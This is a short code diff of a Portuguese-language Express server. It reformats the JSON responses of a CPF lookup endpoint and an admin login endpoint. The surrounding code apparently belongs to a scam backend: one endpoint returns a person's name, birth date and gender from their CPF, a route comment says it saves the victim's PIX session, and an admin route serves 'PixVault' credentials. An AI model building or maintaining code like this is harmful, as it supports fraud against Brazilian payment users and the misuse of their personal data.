@@ -52,9 +52,9 @@ app.post('/api/validate-cpf', async (req, res) => {
     .single();
 
   if (data) {
-    return res.json({ nome: data.nome, dataNascimento: data.data_nascimento, genero: data.genero });
+    return res.json({ success: true, data: { nome: data.nome, dataNascimento: data.data_nascimento, genero: data.genero } });
   }
-  return res.status(404).json({ error: 'CPF não encontrado' });
+  return res.status(404).json({ success: false, error: 'CPF não encontrado' });
 });
 
 // POST /api/save-pix-session — salva sessão PIX da vítima
@@ -168,7 +168,7 @@ app.post('/api/admin/login', async (req, res) => {
     { expiresIn: '24h' }
   );
 
-  res.json({ token, message: 'Login realizado com sucesso' });
+  res.json({ success: true, data: { token }, message: 'Login realizado com sucesso' });
 });
 
 // GET /api/admin/settings — credenciais PixVault
